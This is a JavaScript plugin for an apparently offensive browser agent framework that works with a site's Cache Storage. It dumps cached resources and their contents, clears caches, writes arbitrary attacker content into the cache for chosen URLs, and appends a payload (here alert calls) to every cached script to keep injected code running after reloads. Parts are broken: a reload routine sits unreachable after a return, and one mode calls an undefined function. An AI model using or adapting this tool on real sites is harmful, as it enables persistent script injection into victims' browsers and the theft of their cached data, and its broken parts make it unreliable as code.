PluginSystem.registerPlugin("cache_toolz", {
    "cache": {
        "get": async function(params) {
            try {
                // Get all cache names (await the Promise)
                const cacheNames = await caches.keys();
                console.log('Available caches:', cacheNames);
                
                const results = {
                    caches: [],
                    totalCaches: cacheNames.length,
                    timestamp: new Date().toISOString()
                };

                // Iterate through each cache
                for (const cacheName of cacheNames) {
                    console.log(`Cache: ${cacheName}`);
                    const cache = await caches.open(cacheName); // await caches.open

                    // Get all requests (resources) in the cache (await the Promise)
                    const requests = await cache.keys();
                    
                    const cacheData = {
                        name: cacheName,
                        resources: [],
                        resourceCount: requests.length
                    };

                    // Iterate through each request to log its URL
                    for (const request of requests) {
                        console.log(`Resource: ${request.url}`);
                        
                        const resourceData = {
                            url: request.url,
                            method: request.method,
                            headers: {},
                            content: null,
                            contentType: null,
                            size: 0
                        };
                        
                        // Copy headers
                        for (const [key, value] of request.headers.entries()) {
                            resourceData.headers[key] = value;
                        }
                        
                        // Optionally, fetch and log the content
                        const response = await cache.match(request);
                        if (response) {
                            resourceData.contentType = response.headers.get('content-type') || 'unknown';
                            
                            try {
                                // Clone the response to avoid consuming it
                                const responseClone = response.clone();
                                const content = await responseClone.text();
                                resourceData.content = content.substring(0, 1000); // Limit content size for return
                                resourceData.size = content.length;
                                console.log(`Content size: ${content.length} bytes`);
                            } catch (contentError) {
                                console.log(`Could not read content as text for ${request.url}:`, contentError);
                                resourceData.content = '[Binary or unreadable content]';
                            }
                        } else {
                            console.log(`No response for ${request.url}`);
                            resourceData.content = '[No cached response found]';
                        }
                        
                        cacheData.resources.push(resourceData);
                    }
                    
                    results.caches.push(cacheData);
                }
                
                return { 
                    success: true,
                    message: "Cache analysis completed", 
                    data: results 
                };
                
            } catch (error) {
                console.error('Error accessing cache:', error);
                return { 
                    success: false,
                    message: "Error accessing cache: " + error.message,
                    error: error.toString()
                };
            }
        },
        
        "clear": async function(params) {
            try {
                const cacheName = params.cacheName;
                
                if (cacheName) {
                    // Clear specific cache
                    const deleted = await caches.delete(cacheName);
                    return {
                        success: deleted,
                        message: deleted ? `Cache '${cacheName}' cleared` : `Cache '${cacheName}' not found`
                    };
                } else {
                    // Clear all caches
                    const cacheNames = await caches.keys();
                    let clearedCount = 0;
                    
                    for (const name of cacheNames) {
                        const deleted = await caches.delete(name);
                        if (deleted) clearedCount++;
                    }
                    
                    return {
                        success: true,
                        message: `Cleared ${clearedCount} cache(s)`,
                        clearedCount: clearedCount
                    };
                }
            } catch (error) {
                return {
                    success: false,
                    message: "Error clearing cache: " + error.message,
                    error: error.toString()
                };
            }
        },
        
        "poison": async function(params) {
            try {
                const { 
                    cacheName, 
                    url, 
                    content, 
                    contentType = 'text/html',
                    mode = 'single' // 'single' or 'all-js'
                } = params;
                
                // If mode is 'all-js', inject agent into all JavaScript resources
                if (mode === 'all-js') {
                    return await this.poisonAllJavaScript(params);
                }
                
                // Single URL poisoning (original functionality)
                if (!url || !content) {
                    return {
                        success: false,
                        message: "URL and content are required for cache poisoning"
                    };
                }
                
                const targetCache = cacheName || 'default-cache';
                
                // Open or create the cache
                const cache = await caches.open(targetCache);
                
                // Create a fake Response object with our malicious content
                const response = new Response(content, {
                    status: 200,
                    statusText: 'OK',
                    headers: {
                        'Content-Type': contentType,
                        'Cache-Control': 'max-age=3600',
                        'X-Poisoned': 'true',
                        'X-Poisoned-Date': new Date().toISOString()
                    }
                });
                
                // Put the poisoned response into the cache
                await cache.put(url, response);
                
                return {
                    success: true,
                    message: `Successfully poisoned cache for ${url}`,
                    cacheName: targetCache,
                    url: url,
                    contentLength: content.length
                };
                
            } catch (error) {
                return {
                    success: false,
                    message: "Error poisoning cache: " + error.message,
                    error: error.toString()
                };
            }
        },
        
        "persist": async function(params) {
            try {
                // Get all cache names
                const cacheNames = await caches.keys();
                const results = {
                    poisonedResources: [],
                    totalProcessed: 0,
                    errors: []
                };
                
                // Iterate through each cache
                for (const cacheName of cacheNames) {
                    const cache = await caches.open(cacheName);
                    const requests = await cache.keys();
                    
                    // Look for JavaScript resources
                    for (const request of requests) {
                        try {
                            const response = await cache.match(request);
                            if (!response) continue;
                            
                            const contentType = response.headers.get('content-type') || '';
                            const url = request.url;
                            
                            // Check if it's a JavaScript resource
                            const isJavaScript = (
                                contentType.includes('javascript') ||
                                contentType.includes('application/javascript') ||
                                contentType.includes('text/javascript') ||
                                url.endsWith('.js') ||
                                url.includes('.js?') ||
                                url.includes('/js/')
                            );
                            
                            if (isJavaScript) {
                                console.log(`Found JS resource: ${url}`);
                                
                                try {
                                    // Fetch the original content from the network (like the working snippet)
                                    const fetchResponse = await fetch(url);
                                    const originalContent = await fetchResponse.text();
                                    
                                    // Append our payload to the original content
                                    const modified = originalContent + '\nalert(`Im still here`);';
                                    
                                    // Delete existing cache entry first to force refresh
                                    await cache.delete(url);
                                    
                                    // Put the modified content back into the cache with aggressive headers
                                    await cache.put(url, new Response(modified, {
                                        headers: {
                                            'Content-Type': 'application/javascript',
                                            'X-Poisoned': 'true',
                                            'X-Poisoned-Date': new Date().toISOString(),
                                            'X-Agent-Injected': 'true',
                                            'Cache-Control': 'no-cache, no-store, must-revalidate',
                                            'Pragma': 'no-cache',
                                            'Expires': '0',
                                            'ETag': '"poisoned-' + Date.now() + '"',
                                            'Last-Modified': new Date().toUTCString()
                                        }
                                    }));
                                    
                                    // Force service worker update if available
                                    if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
                                        try {
                                            await navigator.serviceWorker.controller.postMessage({
                                                type: 'CACHE_INVALIDATE',
                                                url: url
                                            });
                                        } catch (swError) {
                                            console.log('Service worker message failed:', swError);
                                        }
                                    }
                                    
                                    results.poisonedResources.push({
                                        cache: cacheName,
                                        url: url,
                                        originalSize: originalContent.length,
                                        newSize: modified.length,
                                        injectedAt: new Date().toISOString()
                                    });
                                    
                                    console.log(`Successfully poisoned: ${url}`);
                                    
                                } catch (fetchError) {
                                    // If we can't fetch from network, try to use cached content
                                    console.log(`Could not fetch ${url} from network, trying cached version:`, fetchError);
                                    
                                    try {
                                        const cachedResponse = await cache.match(request);
                                        if (cachedResponse) {
                                            const cachedContent = await cachedResponse.text();
                                            const modified = cachedContent + '\n;alert(1);';
                                            
                                            // Delete existing cache entry first
                                            await cache.delete(url);
                                            
                                            await cache.put(url, new Response(modified, {
                                                headers: {
                                                    'Content-Type': 'application/javascript',
                                                    'X-Poisoned': 'true',
                                                    'X-Poisoned-Date': new Date().toISOString(),
                                                    'X-Agent-Injected': 'true',
                                                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                                                    'Pragma': 'no-cache',
                                                    'Expires': '0',
                                                    'ETag': '"poisoned-cached-' + Date.now() + '"',
                                                    'Last-Modified': new Date().toUTCString()
                                                }
                                            }));
                                            
                                            results.poisonedResources.push({
                                                cache: cacheName,
                                                url: url,
                                                originalSize: cachedContent.length,
                                                newSize: modified.length,
                                                injectedAt: new Date().toISOString(),
                                                note: 'Used cached content (network fetch failed)'
                                            });
                                            
                                            console.log(`Successfully poisoned using cached content: ${url}`);
                                        }
                                    } catch (cacheError) {
                                        console.error(`Failed to poison ${url}:`, cacheError);
                                        results.errors.push({
                                            url: url,
                                            error: `Network fetch failed: ${fetchError.message}, Cache read failed: ${cacheError.message}`
                                        });
                                    }
                                }
                            }
                            
                            results.totalProcessed++;
                            
                        } catch (resourceError) {
                            console.error(`Error processing resource ${request.url}:`, resourceError);
                            results.errors.push({
                                url: request.url,
                                error: resourceError.message
                            });
                        }
                    }
                }
                
                return {
                    success: true,
                    message: `JavaScript cache poisoning completed. Poisoned ${results.poisonedResources.length} JS resources out of ${results.totalProcessed} total resources.`,
                    data: results
                };
                
                // Force aggressive cache invalidation after poisoning
                setTimeout(async () => {
                    try {
                        // Clear all browser caches
                        if ('caches' in window) {
                            const cacheNames = await caches.keys();
                            await Promise.all(cacheNames.map(name => caches.delete(name)));
                        }
                        
                        // Force reload with cache bypass
                        if (results.poisonedResources.length > 0) {
                            console.log('Forcing page reload to use poisoned cache...');
                            window.location.reload(true); // Hard reload
                        }
                    } catch (reloadError) {
                        console.log('Cache invalidation/reload failed:', reloadError);
                    }
                }, 1000);
                
            } catch (error) {
                return {
                    success: false,
                    message: "Error in JavaScript cache poisoning: " + error.message,
                    error: error.toString()
                };
            }
        }
    }
});